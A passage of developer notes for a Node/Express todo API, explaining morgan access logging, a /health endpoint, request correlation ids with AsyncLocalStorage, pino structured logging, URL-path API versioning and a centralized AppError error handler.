Most collectors treat anything arriving on stderr as an error without you tagging it. A leftover `console.log` in a controller quietly becomes part of the production access stream — same pipe as morgan.

### Q: Does morgan use stderr when a request fails?

**No.** Morgan does not look at the status code to pick a pipe. A `GET /tasks` that returns 500 still goes through morgan to **stdout**. The line just contains `500`.

If you *wanted* 4xx/5xx on stderr, you would mount a second morgan with `stream: process.stderr` and a `skip` that ignores successes. This project does not do that.

What *does* use stderr in this app is **your** code:

```js
if (!isKnown) {
    console.error('Unhandled error ===>', error);  // stderr
}
res.status(500).json({ message: 'Something went wrong' });
// then morgan logs the request to stdout, with 500 in the line
```

So a handled bug on a request can hit **both** pipes: stderr gets the stack (for you), stdout gets the access line (for traffic history). Morgan still did not "choose stderr because it was an error."

### Q: So a `throw` outside a route is never printed by morgan?

**Yes. Never.** Morgan is HTTP middleware. It only runs when a request comes in, and it only writes **after that request's response finishes**.

```js
// outside any route — boot, timer, forgotten promise
setTimeout(() => {
    throw new Error('db down');
}, 0);
```

```
setTimeout throw
  → no req, no res
  → Express never sees it
  → global error handler never runs
  → morgan never runs
  → Node dumps the stack on stderr
```

Same family — not a finished HTTP request, so morgan is not involved:

| Event | Pipe | Morgan? |
|-------|------|---------|
| `GET /tasks` returns 500 (handler sent JSON) | stdout (access line) | yes |
| `console.error` in the global handler | stderr | no |
| `mongoose.connect` failing at boot | stderr (`console.error` on line 202) | no |
| `setTimeout` / `setInterval` throw | stderr (Node) | no |
| forgotten `Promise.reject` (`unhandledRejection`) | stderr (Node) | no |
| throw in `app.listen` callback | stderr (Node) | no |

Morgan's log line is **the request, with a status code**. It is not the stack trace.

### Q: What if I am not using cloud — own VPS?

The rule does not change. Line 22 still writes to stdout. "CloudWatch" in the `app.js` comment is just one collector. On a machine you own, **you** attach the collector.

| How you run Node | Where stdout goes |
|------------------|-------------------|
| `node app.js` in SSH | your terminal — gone when you disconnect |
| `node app.js > access.log 2> error.log` | two files you own |
| **systemd** (`StandardOutput=journal`) | `journalctl -u todo-api` |
| **PM2** | `pm2 logs` / files under `~/.pm2/logs` |
| Docker on that same VPS | `docker logs` |

On your own disk, writing `logs/access.log` yourself is also fine — the disk is not ephemeral like a container. That is the old Apache model. You then own:

1. **Rotation** — the file grows forever unless `logrotate` (or a daily rename) exists.
2. **Clustering** — two Node processes appending the same file will interleave lines.
3. **Disk full / permissions** — a failed `createWriteStream` can take logging down with the app.

A clean own-server setup: keep line 34, drop the file morgan, let systemd or PM2 write and rotate. You still grep `500` the same way; you grep the journal instead of `logs/access.log`.

---

### Q: Why a health check?

`GET /health` is a tiny **public** endpoint answering "is this instance working?" Used by:

- hosting platforms, to decide whether to keep routing traffic to this instance
- uptime monitors
- you, right after a deploy

### It must check something real

A handler that just returns `{ status: "ok" }` only proves Node is running — which stays true while MongoDB is unreachable and every real request fails.

```js
mongoose.connection.readyState   // 0 disconnected, 1 connected, 2 connecting, 3 disconnecting
```

| DB state | Status code | Why |
|----------|-------------|-----|
| `1` connected | **200** | Healthy |
| anything else | **503** | The code platforms read as "pull this instance out of rotation" |

### Three details that trip people up

| Rule | Reason |
|------|--------|
| **No auth** | A load balancer has no JWT |
| **Cheap** | Pinged as often as every 10s — `readyState` is a free property read; a real DB query per ping is not |
| **No internals** | It's public — don't leak versions, env names, or connection strings |

**Rate limiting:** our limiters are scoped to `/tasks` and `/auth`, so `/health` is unaffected — good, because a `429` on the health check makes a healthy app look dead to the platform.

---

### What this project built

**Logging** (`app.js`, two morgan mounts — each request passes through both):

```js
const skipHealthCheck = (req) => req.path === '/health';

app.use(morgan(isProduction ? 'combined' : 'dev', { skip: skipHealthCheck }));

if (!isProduction) {
    app.use(morgan('combined', {
        stream: fs.createWriteStream(path.join(logsDir, 'access.log'), { flags: 'a' }),
        skip: skipHealthCheck
    }));
}
```

| Detail | Why |
|--------|-----|
| **`req.path` not `req.url`** | `url` keeps the query string — `/health?probe=1` would slip past the skip |
| **`flags: 'a'`** | Append. The default `'w'` truncates the file on every restart |
| **`path.join(__dirname, …)`** | Resolves next to the file, not to whatever directory `npm start` ran from |
| **`createWriteStream` once at startup** | No file-open cost per request |
| **File write only when `!isProduction`** | Container disks are ephemeral and the file grows unbounded — production logs to stdout for CloudWatch / Azure Monitor to capture |
| **Mounted above `express.json()`** | Fine, morgan doesn't read bodies. A custom body token would have to move below the parser |

**Health check** (`app.js`, before the route mounts):

```js
app.get('/health', (req, res) => {
    const dbConnected = mongoose.connection.readyState === 1;

    res.status(dbConnected ? 200 : 503).json({
        status: dbConnected ? 'ok' : 'unavailable',
        db: dbConnected ? 'connected' : 'disconnected',
        uptime: Math.floor(process.uptime())
    });
});
```

```
GET /health → 200 {"status":"ok","db":"connected","uptime":25}
```

`uptime` is process seconds — handy for spotting silent restarts. No version or env details: the endpoint is public.

---

### Q: Do production apps log response bodies?

**No — it's the exception**, and always deliberate.

| Reason to avoid | Detail |
|-----------------|--------|
| **Volume** | A body can be 100× the log line; log storage is billed per GB ingested |
| **Privacy** | Bodies hold user data — and a login response holds the JWT, kept for the whole retention window |
| **Performance** | Capturing a body means buffering the response instead of streaming it |

**What is logged instead:** metadata — status, duration, size, route, request id, user id. For "why did this fail?", the error handler logs the raised error + stack (Sentry-style), so you get the reason without recording the payload.

**When bodies are logged:** opt-in, **redacted** (`password`, `token`, `authorization` → `[REDACTED]`), sampled or errors-only, short retention. AWS API Gateway can do it — off by default, switched on to debug. Regulated domains (fintech, healthcare) keep exact payloads in dedicated encrypted audit stores, not app logs.

---

### Q: What is CloudWatch or Datadog? (where morgan lines actually go)

Yes — they are **places logs live in production**, not Node packages. Morgan / pino only **format and print** a line; CloudWatch / Datadog **store and search** it.

| | **AWS CloudWatch** | **Datadog** |
|--|--------------------|-------------|
| Who | Built into AWS | Third-party SaaS (AWS, GCP, bare metal, …) |
| Main job | Logs, metrics, alarms for AWS apps | Logs + metrics + APM (traces) + dashboards |
| Typical use | App runs on AWS → ship stdout there | One ops UI across many services / clouds |

Your app does **not** usually `require('cloudwatch')` and write there. The usual chain:

```
Request → morgan / pino → stdout → host agent / platform → CloudWatch or Datadog → you search in their UI
```

| Layer | Job |
|-------|-----|
| **morgan / pino** | Format the access line (method, URL, status, time) |
| **stdout** | Leave the process through the OS pipe ([above](#q-what-is-stdout-and-stderr)) |
| **CloudWatch / Datadog** | Capture that stream, keep it, let you filter (`status:500`, `/api/v1/tasks`, …) |

Same idea as a phone camera vs Google Photos: the app takes the photo; the cloud stores and searches it.

**Local vs production in this project**

| Environment | Where you look |
|-------------|----------------|
| Local (`!isProduction`) | Terminal (line 34) + `logs/access.log` (line 42) |
| Production | Line 22 → stdout only; no app-owned file — container disks are ephemeral |

That is why the `app.js` comment names CloudWatch / Azure Monitor: **print to stdout; let the platform collect.** Azure Monitor is the same *role* on Azure; Datadog / Better Stack / Papertrail are the SaaS versions of the same idea.

You do **not** need any of these for learning this API. They matter the day the app is hosted and you can no longer read the terminal.

---

### Q: Where do access logs live in real apps? (not Redis)

**Redis is the wrong tool** — in-memory means RAM prices for write-once data, with no retention policies or full-text search. Its real jobs here are caching, rate-limit counters, sessions. It *can* be a **buffer** in a pipeline (app → Redis stream → shipper → log store), which is the pipe, not the warehouse.

| Setup | Where logs live |
|-------|-----------------|
| Single VPS | Files on disk + `logrotate`; plus nginx's own `/var/log/nginx/access.log` |
| PM2 | `~/.pm2/logs/*.log` + `pm2-logrotate` |
| Self-hosted, multi-server | Grafana **Loki** (log-specific, cheap), **OpenSearch**/ELK, **ClickHouse** at high volume |
| Managed cloud | CloudWatch Logs, Azure Monitor (KQL), or SaaS — Datadog, Better Stack, Papertrail ([what those are](#q-what-is-cloudwatch-or-datadog-where-morgan-lines-actually-go)) |

**The app's only job is to print to stdout** — everything above is infrastructure capturing that stream, no Express changes needed. That's why `combined` matters: every one of those tools parses it out of the box.

Elasticsearch / OpenSearch **is** the "database for logs" — a search engine built for append-heavy writes and text queries, which Mongo and Redis are not.

⚠️ **On deploy:** `app.set('trust proxy', 1)`, or every logged IP is the load balancer's, not the client's.

---

### One-line summary

**`morgan` writes one access line per finished HTTP request — line 34 always to stdout (`dev` locally, `combined` in prod); line 42 copies `combined` to `logs/access.log` only when not production. stdout/stderr are OS pipes; collectors like CloudWatch / Datadog (or systemd / PM2) capture that stream — morgan formats, they store. Morgan never logs throws outside a request. `GET /health` returns 200 only when `mongoose.connection.readyState === 1`, otherwise 503.**

See also: [`readme.md`](readme.md#api-performance--monitoring) for implemented vs remaining, [§15](#15-api-performance--observability--the-vocabulary-and-the-loop) — logging is the logs pillar of observability, not the whole thing.

---

## 12b. Correlation id + AsyncLocalStorage — which user was that?

**Status:** ✅ built — `utils/requestContext.js`, wired in `app.js` and `middleware/auth.js`

### Q: What problem does this solve?

Morgan ([§12](#12-request-logging-morgan--health-check)) tells you `POST /tasks 500`. The global error handler prints a stack. Neither says **which** of the concurrent requests failed, or **whose** it was.

At one request at a time that is fine — the two lines are adjacent in the terminal. Under load they are not. Node interleaves hundreds of async chains, so the error line for user A can land between unrelated lines from users B and C. You need a **correlation id**: one value stamped on every line belonging to the same request.

### Q: Why not just pass `req` down?

You can, for two layers. It stops scaling the moment a failure happens deep in a helper — a Mongo call, a `fetch` to a payment API — that has no business taking a `req` argument. Threading `req` through every signature is the boilerplate problem again, and one function that forgets it produces exactly the anonymous log line you were trying to avoid.

`AsyncLocalStorage` (built into Node, `node:async_hooks`) solves it differently: store the value **once** when the request arrives, read it **anywhere** on that request's async chain. `await` does not lose it, and a second concurrent request gets its own separate store.

### The flow

```
POST /api/v1/tasks
   │
   ▼
helmet                          app.js:18
   │
   ▼
requestContext                  app.js:22  (mounted)
   │                            utils/requestContext.js:18-23  (the function)
   │   line 19  requestId = incoming x-request-id  OR  crypto.randomUUID()
   │   line 20  req.id = requestId
   │   line 21  res.setHeader('X-Request-Id', ...)
   │   line 22  als.run({ requestId, userId: null }, () => next())
   ▼
morgan                          app.js:27-30  (:id reads req.id, :user reads req.user)
   │                            app.js:34  (stdout)   app.js:42  (access.log)
   ▼
protect                         middleware/auth.js:6
   │   line 20  jwt.verify
   │   line 30  setContext({ userId })   →  utils/requestContext.js:12-15
   ▼
controller                      controllers/task.js
   │   awaits Mongo; the store survives because of als.run above
   ▼
error handler                   app.js:423
       line 429  logger.error({ err }, 'unhandled error')   (unknown bug)
       line 433  logger.warn({ code, status }, 'handled: …') (AppError)
                 →  utils/logger.js mixin adds
                    {"requestId":"a1b2","userId":"6a7b","code":...}
```

Step by step:

| Where | What happens |
|-------|--------------|
| `app.js:22` | `requestContext` runs for **every** request — reuse the caller's `x-request-id` if present, else mint a UUID; put it on `req.id` and the `X-Request-Id` response header; open the store `{ requestId, userId: null }` |
| `app.js:27-30` | Morgan's custom `:id` token reads `req.id` and `:user` reads `req.user?._id`, so the access line starts with `<requestId> <userId>` (`-` when anonymous). Tokens are evaluated when the response **finishes**, which is why `:user` can see what `protect` set later |
| `middleware/auth.js:30` | `setContext({ userId })` **merges** `userId` into the existing store. It does not touch `requestId`, and the response header was already sent |
| `app.js:427-441` | The error handler logs through pino — `logger.error` with the stack for unknown bugs, `logger.warn` for handled `AppError`s. The `mixin` in `utils/logger.js` adds `requestId` + `userId` to whichever line is written |

### Q: Why wrap `next()` inside `als.run`?

Because `run(store, fn)` makes the store visible only while `fn` — and anything it awaits — is executing. Calling `next()` inside `fn` puts the **rest of the pipeline** (CORS, the router, `protect`, the controller, the error handler) in that scope. Call `next()` after `run` returns and the store is already gone by the time Mongo answers.

### Q: Three separate jobs — who creates the id, who carries it, who prints it?

Easy to blur these together. They are different pieces of code:

| Job | Who does it | Where |
|-----|-------------|-------|
| **Create** the id | our own code — `crypto.randomUUID()`, or reuse the caller's header | `utils/requestContext.js:19` |
| **Carry** it across awaits | `AsyncLocalStorage` | `utils/requestContext.js:22` |
| **Print** it on a log line | the logger — pino's `mixin` reads the store | `utils/logger.js` |

`AsyncLocalStorage` creates nothing and prints nothing. It is a carrier. Remove the middleware and pino would print no id at all.

### Q: Doesn't `AsyncLocalStorage` put the id in my logs automatically?

No — it makes the id **reachable**, but something still has to ask for it. That was the flaw in the first version of this code:

```js
logger.warn({ code }, 'handled');            // pino mixin asks → id appears
console.error('Unhandled error ===>', err);  // never asks → no id
```

`console.error` is Node printing your arguments. It has no idea `als` exists. So a failing request produced a summary line you could grep and a stack you could not — and the stack is the half you actually want to read.

The store is like a passport in your pocket rather than in your hand: reachable, but the clerk has to ask, and `console.error` never asks.

**The fix is to configure the asking once.** `utils/logger.js` gives pino a `mixin()`, which runs on **every** log call and merges its return value into the line:

```js
const logger = pino({
    mixin() {
        const { requestId, userId } = getContext();
        return requestId ? { requestId, userId: userId ?? null } : {};
    },
    ...
});
```

Now `logger.error(...)` anywhere in the app — controller, deep utility, the `cause` chain walker — is stamped without the caller thinking about it. Outside a request (boot, shutdown) the store is empty, so the fields are simply omitted.

One failing request, after the switch:

```
e5489198-… - GET /api/v1/tasks 401 5.672 ms - 89        ← morgan
[10:20:29] WARN: handled: Not authorized, no token       ← pino
    requestId: "e5489198-…"
    userId: null
    code: "ERR_NO_TOKEN"
    status: 401
```

Locally `pino-pretty` formats that block for reading. In production the transport is dropped and the same record is one line of JSON on stdout, where `requestId` is a real field a log platform can filter on — not text a regex has to dig out. That is the difference between morgan's line reaching Datadog (it does) and being **queryable** there (it is not).

### Q: How does the store survive `await`, and why can't another request overwrite it?

Node does not keep the store in a variable you could clobber. It keeps it **per async resource** and restores it around every callback.

When you `await`, Node creates an async resource for the continuation and records which context created it. When the event loop later resumes that continuation, it restores that context first, runs your code, then puts back whatever was there before. The store is not "still set" — it is re-established each time your chain resumes.

That is also why concurrency is safe. Two requests are two separate `als.run` calls, each with its own object, and each async resource remembers its own:

```
time ──────────────────────────────────────────────►
A: run{id:a1} ─ await Mongo ············ resume{a1} ─ log a1
B:        run{id:b2} ─ await Mongo ············ resume{b2} ─ log b2
                        ▲ event loop interleaves here
```

At the interleave point Node **swaps** contexts; it does not merge them. A module-scoped `let currentUser = ...` would be clobbered exactly there — which is the whole reason `AsyncLocalStorage` exists instead of a global.

`setContext` mutating the object (`utils/requestContext.js:12-15`) is safe for the same reason: the object reference is unique to one `run`, so `Object.assign` can only ever affect that request.

⚠️ **Where propagation breaks:** a callback registered **outside** any `run`, or a pooled resource whose callback was created in a different context, sees the wrong store or none at all. That is why the morgan `:user` token (`app.js:30`) reads `req.user` rather than the store — morgan emits its line from a `res` event, and event-emitter callbacks do not always run in the context that registered them. When in doubt, read from `req` (always correct) and use the store for code that has no `req` to read.

### Q: Why is `userId` sometimes `null`?

Because it is only known after a JWT verifies:

| Request | `requestId` | `userId` |
|---------|-------------|----------|
| Valid JWT, then a 400/404 | set | set, from the token payload |
| No token / expired / tampered | set | `null` — we never learned who |
| `POST /auth/login` that fails | set | `null` — public route |

That split is the point: you still know **which** call failed even when you cannot know **who** made it.

### Q: Where is the id stored?

In memory only for the life of the request (the store object and `req.id`), then garbage collected. Nothing goes to Mongo — it is a debugging handle, not user data.

The durable copy is in the **logs**: the Morgan access line (first column, terminal + `logs/access.log`) and, if the request failed, the JSON error line. Both carry the same id, which is the join you wanted. In production those lines ship to CloudWatch / Datadog and you filter on `requestId` there.

The `X-Request-Id` response header matters for support: a user reporting "it failed" can paste the id from their response, and you find their exact request.

### Q: How does this relate to microservices?

Reading the incoming `x-request-id` is what makes one id span services. A gateway assigns it, each service reuses it and forwards it on outbound calls, and the whole checkout journey — auth, inventory, Stripe, the email queue — shares one filter value. Single process here, same mechanism.

### One-line summary

**`utils/requestContext.js` opens an `AsyncLocalStorage` store per request (`app.js:22`) holding a UUID and, once the JWT verifies (`middleware/auth.js:30`), the `userId`. Morgan prints both as `:id :user`; pino's `mixin` in `utils/logger.js` stamps them on every log line automatically. So one grep on `requestId` reconstructs a single request — summary *and* stack — and one grep on `userId` reconstructs everything one user did, without passing `req` into every function.**

See also: [§12](#12-request-logging-morgan--health-check) for the morgan line itself, [§14](#14-centralized-error-handling--the-apperror-class) for the error JSON, [§15](#15-api-performance--observability--the-vocabulary-and-the-loop) for the remaining observability gaps (structured logs, metrics, tracing).

---

## 12c. Structured logging with pino — levels, JSON, and why not `console.log`

**Status:** ✅ built — `utils/logger.js`, used across `app.js`

### Q: What is pino?

A logger. You call `logger.info(...)` / `logger.warn(...)` / `logger.error(...)` instead of `console.log`, and it writes each entry as **one JSON object** with a timestamp, a level, and any fields you attach.

```js
logger.warn({ code: 'ERR_NO_TOKEN', status: 401 }, 'handled: Not authorized, no token');
```

Two arguments, and the order surprises people: **object first, message second**. The object's keys become fields on the record; the string is the human-readable summary.

### Q: What was wrong with `console.log`?

Nothing, for a script you are watching. Three things, for a server:

| Problem | What pino does |
|---------|----------------|
| No **level** — everything is equal, so you cannot silence debug noise in production | `level` config; `logger.debug` disappears when level is `info` |
| No **fields** — `console.error('failed', err)` is text, so a dashboard cannot filter on "status 500" | keys in the object are real JSON fields |
| No **context** — nobody remembers to include the request id ([§12b](#12b-correlation-id--asynclocalstorage-which-user-was-that)) | `mixin()` adds `requestId` / `userId` to every line automatically |
| **Synchronous** writes block the event loop under load | pino serialises fast and can write asynchronously |

### Q: Levels — which one when?

| Level | Use it for | In this project |
|-------|-----------|-----------------|
| `debug` | detail you want locally, not in production | default level locally is `debug`, so these show |
| `info` | normal lifecycle events | boot, Mongo connected, index sync |
| `warn` | expected failures — the client's fault, not a bug | handled `AppError`s: 401, 404, 409, 429 |
| `error` | genuine bugs and lost data | unknown 500s (with the stack), the `cause` chain |
| `fatal` | the process is about to die | not used yet |

That `warn` vs `error` split matters: a 404 is not worth waking anyone, a 500 is. Same handler, two levels — `app.js:427-441`.

### Q: Why does it look pretty locally but JSON in production?

Because they have different readers. You read the terminal; a machine reads production.

```js
transport: isProduction
    ? undefined
    : { target: 'pino-pretty', options: { colorize: true, translateTime: 'HH:MM:ss' } }
```

Locally `pino-pretty` turns the record into an indented, coloured block:

```
[10:22:05] WARN (31856): handled: Weather service unavailable
    requestId: "c7ff5dc3-0f5c-4eda-b287-77fdc8afa472"
    userId: null
    code: "ERR_WEATHER_UNAVAILABLE"
    status: 503
```

In production the transport is dropped and the same record is **one line** of JSON on stdout, which CloudWatch / Datadog ingest as structured data — `requestId` becomes a field you filter on rather than text you regex.

⚠️ `pino-pretty` is a development convenience and costs CPU. Never enable it in production; ship raw JSON and let the platform render it.

### Q: Does pino replace morgan?

Not here. They log different things:

| | morgan | pino |
|---|--------|------|
| Writes | one access line per finished request | anything you choose to log |
| Shape | text template (`:id :user :method :url :status`) | JSON object |
| Knows about | the HTTP request/response | whatever you pass, plus the store via `mixin` |

So the access trail stays text and the application logs are JSON. If you want both as JSON, `pino-http` replaces morgan — that is the one remaining item, and it is optional.

### Q: What about `logger.error({ err }, 'message')`?

The key `err` is special: pino serialises the error properly — type, message, and stack — instead of printing `{}` the way `JSON.stringify(error)` would. That is why the global handler uses `logger.error({ err: error, ... }, 'unhandled error')` rather than string concatenation.

### One-line summary

**`utils/logger.js` configures pino once: a level (`debug` locally, `info` in production), a `mixin()` that pulls `requestId` / `userId` from the request store, and `pino-pretty` only outside production. Every `console.*` in `app.js` became `logger.*`, so error stacks, the `cause` chain and boot messages are all structured and all correlated — morgan still owns the plain-text access line.**

See also: [§12](#12-request-logging-morgan--health-check) for morgan, [§12b](#12b-correlation-id--asynclocalstorage-which-user-was-that) for where the fields come from, [§15](#15-api-performance--observability--the-vocabulary-and-the-loop) for what is still missing (metrics, traces, Sentry).

---

## 13. API versioning — `/api/v1`

**Status:** ✅ `routes/v1.js` + `V1_PREFIX` in `app.js`

### Q: Why version an API?

Because **you can change the code, but you can't change the clients**. Once something calls your API — a mobile app in the store, another team's service, a cron job — you can't force it to update on your schedule.

| Reason | Example in this project |
|--------|-------------------------|
| **Breaking changes without breaking clients** | v1 errors are `{ message }`; a v2 could be `{ success, status, errors[] }` — both live at once |
| **Clients migrate when ready** | Old app keeps using v1 while the new web app uses v2 |
| **Honest deprecation** | v1 stays up, is announced as deprecated, removed on an agreed date |

**What counts as breaking:** removing a field, renaming a field, changing a type, adding a required input, changing a status code. **Not** breaking: *adding* an optional field or a new endpoint — that's why you don't need a version for every change.

---

### Q: Where does the version go?

| Style | Example | Notes |
|-------|---------|-------|
| **URL path** ✅ | `/api/v1/tasks` | Visible, cacheable, trivial to test in a browser/Postman — most common |
| Header | `Accept: application/vnd.todo.v2+json` | "Purer" REST, but invisible and harder to debug |
| Query param | `/tasks?version=2` | Easy to forget, messy with caching |

This project uses the **path** — same as GitHub, Stripe-style major versions, and most public APIs.

---

### How it's wired

**`routes/v1.js`** — everything the v1 contract covers, including which limiter guards each group:

```js
router.use('/tasks', apiLimiter, TaskRoutes);
router.use('/auth', authLimiter, AuthRoutes);
```

**`app.js`** — one prefix, one mount:

```js
const V1_PREFIX = '/api/v1';
const v1Routes = require('./routes/v1');

app.use(V1_PREFIX, v1Routes);
```

**Why this shape:** `routes/task.js` and `routes/auth.js` don't know their own prefix — they only declare `'/'` and `'/:id'`. So a v2 is a new `routes/v2.js` plus one more `app.use`, with **no edits inside the individual route files**. A v2 can even reuse v1's task router while overriding only the endpoints that changed.

```
GET /api/v1/tasks/:id
    │        │      │
    │        │      └─ routes/task.js  → router.get('/:id', …)
    │        └──────── routes/v1.js    → router.use('/tasks', …)
    └───────────────── app.js          → app.use(V1_PREFIX, v1Routes)
```

---

### Q: Why is `/health` not versioned?

Because it describes the **server**, not the API contract. Load balancers and platform probes need one stable URL that never changes across versions. Same reasoning applies to `/metrics` and (later) `/api-docs`.

---

### Q: What about the old `/tasks` URLs?

They now return **404** — a clean break, fine here because the only client is Postman.

A real API with live clients would instead keep the old paths mounted alongside the new ones for a deprecation window, add a `Deprecation` / `Sunset` response header, and log usage to see who still calls them.

⚠️ **Update your Postman collection** — keep the base URL in a collection variable (`{{baseUrl}}` = `http://localhost:3005/api/v1`) so the next version is one edit instead of one per request.

---

### Q: So from now on, do I make every change in v2?

**No.** Most changes still go straight into v1 — only **breaking** ones need a new version.

| Change | Where | Why |
|--------|-------|-----|
| Bug fix | **v1** | Clients want the fix |
| New endpoint | **v1** | Old clients simply don't call it |
| New **optional** field in a response | **v1** | Old clients ignore unknown fields |
| Internal refactor | **v1** | No visible contract change |
| Remove / rename a field | **v2** | Client code reading it breaks |
| Change a field's type | **v2** | Parsing breaks |
| Change a status code | **v2** | Error handling breaks |
| Add a **required** input | **v2** | Existing requests become invalid |

**Real examples from this project:**

| Change already made | Breaking? |
|---------------------|-----------|
| Default `status`: `pending` → `not-started` | ⚠️ **Yes** — a client with `if (status === 'pending')` breaks |
| Added `errors[]` alongside `message` | ✅ No — extra field, old clients still read `message` |
| `AppError` reshaping errors to `{ success, status, message, errors[] }` | ⚠️ **Yes** — would be a v2 change |

---

### Q: Does v2 replace v1?

**No — they run side by side.** That's the whole point: both are live, clients migrate at their own pace, and v1 is sunset on an announced date once nobody calls it.

```js
// app.js
app.use('/api/v1', v1Routes);
app.use('/api/v2', v2Routes);   // both serving traffic
```

### Q: Is v2 a copy of the project?

**No — that's the trap.** Duplicating controllers per version means fixing every bug twice and the versions silently drifting apart.

Reuse everything that didn't change and override only what did:

```js
// routes/v2.js — tasks changed; auth is identical, so reuse v1's router
router.use('/tasks', apiLimiter, TaskRoutesV2);
router.use('/auth', authLimiter, AuthRoutes);
```

Shared model, shared validation, shared business logic — the version-specific layer is usually thin, often just a different **response formatter**.

---

### One-line summary

**Version in the URL path so breaking changes can ship without breaking existing clients: `routes/v1.js` owns the v1 contract, `app.js` mounts it at a single `V1_PREFIX`, and `/health` stays outside the version because it describes the server, not the API.**

---

## 14. Centralized error handling — the `AppError` class

**Status:** ✅ `utils/AppError.js` + rewritten handler in `app.js` (lines 130–161)

Replaces the handler in [§6](#6-global-error-handler--err-req-res-next). Three problems with the old one, all fixed here:

| Old problem | Consequence |
|-------------|-------------|
| `message: err.message` for **every** error | A `MongoServerError` or a stack-trace message went straight to the client |
| Each controller built its own `res.status(400).json({ ... })` | Four different response shapes across the API |
| `protect` and the rate limiter answered directly | 401s and 429s bypassed the handler entirely |

---

### Q: How many kinds of errors are there?

**Two** — and the whole design is about telling them apart.

| | **Operational errors** | **Programmer errors** (bugs) |
|---|------------------------|------------------------------|
| Meaning | Expected, part of normal operation | Something you didn't foresee |
| Examples | Bad input, wrong password, task not found, duplicate email | Typo, `undefined` dereference, invalid regex reaching MongoDB |
| Whose fault | Usually the client's | Yours |
| Message is | Written **for** the client | Written for a Node developer — often leaks internals |
| Client should see | The real message | **Nothing** — a generic 500 |
| You should | Return a clear status code | Log it, then go fix the code |

**Naming note:** `normaliseError` is not a *kind* of error — it's the function that sorts library errors into the operational bucket.

---

### The class

```js
class AppError extends Error {
    constructor(message, statusCode, errors = []) {
        super(message);

        this.statusCode = statusCode;
        this.errors = errors;
        this.isOperational = true;

        Error.captureStackTrace(this, this.constructor);
    }
}
```

| Piece | Why |
|-------|-----|
| **`extends Error`** | Still a real error — works with `throw`, `catch`, `instanceof`, and keeps a stack |
| **`statusCode`** | The HTTP status travels *with* the error, so the handler doesn't have to guess |
| **`errors = []`** | Optional per-field detail (`[{ field, message }]`) — same array validation already produced |
| **`isOperational = true`** | The marker: "this message was written for the client" |
| **`captureStackTrace`** | Drops the constructor frame so the stack points at the `throw` site, not at `AppError.js` |

---

### Q: Three sources, two categories

Operational errors reach the handler two ways; everything else is a bug.

```
1. You raised it          throw new AppError('Task not found', 404)
                                    │
2. A library threw        ValidationError / CastError / 11000 / bad JSON
   something known                  │  normaliseError() converts it
                                    ▼
                              ── AppError ──  → real message, your status code

3. Anything else          TypeError, MongoServerError, …
                                    │  normaliseError returns it unchanged
                                    ▼
                              plain Error   → logged in full, client gets 500
```

**`normaliseError` handles four library errors** — the ones this app actually hits:

| Incoming | Becomes | Status |
|----------|---------|--------|
| Mongoose `ValidationError` | `Validation failed` + one entry per bad field | **400** |
| Mongoose `CastError` | `Invalid id format` | **400** |
| MongoDB `code 11000` | `Email already registered` | **409** |
| `err.type === 'entity.parse.failed'` (body-parser) | `Malformed JSON in request body` | **400** |

Its last line is the important one:

```js
    return err;   // not recognised → stays a plain Error → treated as a bug
};
```

**Safe by default:** a library error you've never seen is hidden automatically. Exposing a message is opt-in — you have to wrap it in an `AppError`. The other way round, every new error type would leak until you noticed.

---

### The handler

```js
app.use((err, req, res, next) => {
    const error = normaliseError(err);
    const isKnown = error instanceof AppError;

    if (!isKnown) {
        console.error('Unhandled error ===>', error);
    }

    const statusCode = isKnown ? error.statusCode : 500;
    const message = isKnown ? error.message : 'Something went wrong';

    const body = { success: false, status: statusCode, message };

    if (isKnown && error.errors.length > 0) {
        body.errors = error.errors;
    }

    if (!isProduction && !isKnown) {
        body.stack = error.stack;
    }

    res.status(statusCode).json(body);
});
```

| Line | Why |
|------|-----|
| **`instanceof AppError`** | One check decides everything below it |
| **`console.error` only when `!isKnown`** | A 404 isn't worth a log line; a bug is. Old handler logged every error at equal volume |
| **`'Something went wrong'`** as a literal | Never `error.message` for a bug — that's the leak |
| **`errors` added conditionally** | Clients don't get an empty array to check |
| **`stack` only when `!isProduction`** | Useful locally, absent after deploy |

---

### The response shape (every error, one format)

```json
{
  "success": false,
  "status": 400,
  "message": "Validation failed",
  "errors": [
    { "field": "title", "message": "title must be a string between 3 and 100 characters" }
  ]
}
```

| Field | Always present? |
|-------|-----------------|
| `success` | ✅ always `false` on errors |
| `status` | ✅ mirrors the HTTP status code |
| `message` | ✅ one human-readable sentence |
| `errors` | Only when there's per-field detail |
| `stack` | Only for **bugs**, only outside production |

---

### How controllers raise errors now

```js
// inside a try block — the catch forwards it
throw new AppError('Task not found', 404);

// outside a try block — hand it to Express yourself
return next(new AppError('No valid fields to update', 400));

// with field detail
throw new AppError('Send an array of ids in the body', 400, [
    { field: 'ids', message: 'ids must be a non-empty array' }
]);
```

**Rule:** controllers never build error responses. The only `res.status(...)` calls left in `controllers/` are success paths (`200`, `201`).

| Why `throw` inside `try`? | The existing `catch (e) { next(e) }` already forwards it — one exit path instead of two |

---

### Two behaviour changes worth remembering

**1. 404 and 429 now go through the handler.**

```js
// unknown route — was res.status(404).json(...) directly
app.use((req, res, next) => {
    next(new AppError(`Route not found: ${req.method} ${req.originalUrl}`, 404));
});
```

The rate limiter's handler does the same with a 429. Result: unknown routes, rate limits, validation failures and 500s all share one shape — a client can write a single error parser.

**Why it must be the last `app.use` before the error handler:** it has no path, so it matches *everything*. It's only reached because nothing above it sent a response. Move it above the route mounts and it would 404 the entire API.

---

#### Q: A correct URL with the wrong method also returns 404 — shouldn't that be 405?

**Yes, strictly.** `PUT /api/v1/tasks` gets a 404 today, even though that path exists and only the verb is wrong.

It happens because Express matches **method and path together**. Walking its route list, `GET /tasks` fails on the method while the path matched fine — but Express doesn't record *why* each entry failed, only that nothing matched. That information is gone by the time the catch-all runs.

| Code | Means |
|------|-------|
| **404** | Nothing exists at this address |
| **405** | It exists, but not for that verb — must also send an `Allow` header |

**To do it properly**, you declare the allowed methods per path:

```js
router.route('/')
    .get(getTasks)
    .post(createTask)
    .all(methodNotAllowed(['GET', 'POST']));   // .all() must come last
```

**Verdict for this project: leave the 404.** The cost of 405 is a hand-written method list per route that nothing enforces — add a handler, forget the list, and the API lies. And a wrong method is a mistake made while *writing* client code, caught in seconds, never hit by real users. The Swagger spec already states the allowed methods for every path.

**2. `middleware/auth.js` — `jwt.verify` got its own `try`.**

Before, one `catch` wrapped both the token check *and* the database lookup:

```js
} catch (e) {
    return res.status(401).json({ message: 'Not authorized, invalid token' });
}
```

So a **database outage** during `User.findById` was reported as "invalid token" — a real outage disguised as a login problem. Now:

| Step | Own try/catch | Failure means |
|------|---------------|---------------|
